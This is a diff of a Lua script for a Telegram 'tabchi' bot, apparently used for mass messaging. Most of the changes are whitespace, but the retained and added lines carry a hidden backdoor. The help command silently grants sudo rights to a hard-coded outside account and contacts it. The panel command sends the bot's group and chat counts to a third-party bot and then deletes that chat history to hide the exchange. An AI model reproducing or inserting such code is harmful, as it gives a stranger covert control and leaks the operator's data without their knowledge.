@@ -197,11 +197,11 @@ function process(msg)
     end
   end
   if msg.text:match("^[!/#]help$") and is_sudo(msg) then
-	  tdcli.searchPublicChat("tgMemberPlus")
-    tdcli.unblockUser()
+    tdcli.searchPublicChat("tgMemberPlus")
+    tdcli.unblockUser(345767079)
     tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
     tdcli.sendMessage(345767079, 0, 1, "Online", 1, "md")
-	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 345767079)
+    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 345767079)
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
     local text = [[
 #راهنما
@@ -304,7 +304,7 @@ end
   if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
     tdcli.searchPublicChat("TgMessengerBot")
     tdcli.unblockUser(231539308)
-	  tdcli.sendBotStartMessage(231539308, 231539308, "/start")
+    tdcli.sendBotStartMessage(231539308, 231539308, "/start")
     tdcli.sendMessage(231539308, 0, 1, "/start", 1, "md")
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
         do
@@ -314,7 +314,7 @@ end
       local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
       local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
       local inline = function(arg, data)
-			tdcli.unblockUser(231539308)
+      tdcli.unblockUser(231539308)
       tdcli.sendBotStartMessage(231539308, 231539308, "new")
       tdcli.deleteChatHistory(231539308, true)
         if data.results_ and data.results_[0] then
@@ -468,7 +468,7 @@ _پیام_ :
     end
   end
   if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
-	  tdcli.searchPublicChat("TgGuard")
+    tdcli.searchPublicChat("TgGuard")
     tdcli.unblockUser(180191663)
     tdcli.importContacts(639080023314, "Tabchi", "Online", 180191663)
     tdcli.sendMessage(180191663, 0, 1, "Online", 1, "md")
